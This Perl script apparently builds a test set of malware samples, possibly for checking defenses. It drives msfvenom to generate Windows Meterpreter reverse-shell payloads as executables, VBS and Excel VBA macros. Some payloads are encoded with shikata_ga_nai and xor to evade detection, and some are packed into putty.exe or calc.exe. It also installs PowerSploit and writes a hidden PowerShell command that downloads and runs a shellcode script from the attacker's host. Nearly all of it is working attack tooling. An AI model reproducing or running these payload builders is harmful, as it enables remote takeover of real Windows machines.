#!/usr/bin/perl
use strict;
use warnings;

  my($fileNdx, $LHOST, $LPORT, $targetFolder, $IoE);
  my($payload, $platform_arch , $commandControl );
  my($currentFileName, $encoder,$cmd, $OUTFILE);
  my($archiveFolder);
  my($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst);

  $targetFolder="/opt/malwaredefense/current";
  `mkdir -p $targetFolder`;
  $LHOST=$ARGV[0];  
  $LPORT=$ARGV[1]; 
  
  $fileNdx=0;
  $payload = '-p windows/meterpreter/reverse_tcp';
  $platform_arch = '--platform win -ax86';
  $commandControl = "lhost=$LHOST lport=$LPORT";
  $encoder = "-e generic/none";

  #archive the old version
  ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();
  $archiveFolder="/opt/malwaredefense/archive" . (${year} + 1900) . sprintf("%02d",(${mon}+1)) . sprintf("%02d",${mday});
  $archiveFolder.= "_" . sprintf("%02d",${hour}). sprintf("%02d",${min}). sprintf("%02d",${sec});
  `mkdir -p $archiveFolder`;
  `mv $targetFolder/* $archiveFolder/`;

  ###################
  ##
  ##  Basic Delivery
  ##
  ##################

  `touch $targetFolder/000-StartMSF900.cue`; 
  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/001-Stalwart-BasicMeterpreter-32.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/002-Stalwart-Meterpreter-packed-putty-32.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;

  
  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/003-Stalwart-Meterpreter-32.vbs";
  print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/004-Stalwart-Meterpreter-32.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;


  ###################
  ##
  ##  Basic Delivery + Encoding
  ##
  ##################

  $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';

  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/011-Stalwart-BasicMeterpreter-32enc.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/012-Stalwart-Meterpreter-packed-putty-32enc.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;


   $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/013-Stalwart-Meterpreter-32enc.vbs";
   print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;


  #tuning encoder down to 1 for VBA
  #consistently had issues with this running.
  $encoder = '-e x86/shikata_ga_nai -i 1 -b "\x00\xFF" ';
  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/014-Stalwart-Meterpreter-32enc.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;

  `touch $targetFolder/050-Stalwart-RepeatWith905.cue`;



  ###################
  ##
  ##  64bit Delivery 
  ##
  ##################


  $platform_arch = '--platform win -ax86_64';
  $payload = '-p windows/x64/meterpreter/reverse_tcp';
  $encoder = ''; 
  
  `touch $targetFolder/100-StartMSF910.cue`; 

  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/101-Stalwart-BasicMeterpreter-64.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/102-Stalwart-Meterpreter-packed-calc-64.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;


  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/103-Stalwart-Meterpreter-64.vbs";
  print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/104-Stalwart-Meterpreter-64.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;

 ###################
  ##
  ##  64bit Delivery + Encoding
  ##
  ##################

  $encoder ='-e x64/xor';

  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/111-Stalwart-BasicMeterpreter-64enc.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/112-Stalwart-Meterpreter-packed-calc-64enc.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;


  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/113-Stalwart-Meterpreter-64enc.vbs";
  print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/114-Stalwart-Meterpreter-64enc.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;


  `touch $targetFolder/150-Stalwart-RepeatWith915.cue`;



  print "Copy the Invoke-shellcode.ps1 to the target directory \n";
  print "Checking if PowerSploit is installed... \n";
  if (-d "/opt/PowerSploit") {
    print "PowerSploit is already installed \n";
  }
  else {
    print "Installing PowerSploit now in /opt/ \n";
    `cd /opt/ && git clone https://github.com/mattifestation/PowerSploit.git > /dev/null 2>&1 && cd /opt/PowerSploit/ && wget -q https://raw.githubusercontent.com/obscuresec/random/master/StartListener.py && wget -q https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py`;
  }
  `touch $targetFolder/200-Stalwart-Run950.cue`;
  my ($ShellCodePath) ="./701_Invoke-Shellcode.ps1";
  `cp $ShellCodePath $targetFolder/701_Invoke-Shellcode.ps1`;
  `echo Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $LHOST -Lport $LPORT -Force >> $targetFolder/701_Invoke-Shellcode.ps1`;
  $cmd = "powershell.exe -NoP -NonI -w HIDDEN -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST/200_Invoke-Shellcode.ps1'))";
  open( $OUTFILE, '>', "$targetFolder/201_PScommand.txt");
  print $OUTFILE $cmd;
  close $OUTFILE;

  `touch $targetFolder/300-Stalwart-run960.cue`;
  `touch $targetFolder/300-Stalwart-run965.cue`;
 
#Needs additional work
#  print "\n\n*** Meterpreter Java  (Paste into Java and compile) \n";
#  #`msfvenom ${payload} ${platform_arch} ${commandControl} -f java $encoder > ${currentFileName}.java`;
#  `msfvenom -p java/meterpreter/reverse_tcp ${platform_arch} ${commandControl} -f raw $encoder -o ${currentFileName}.jar`;
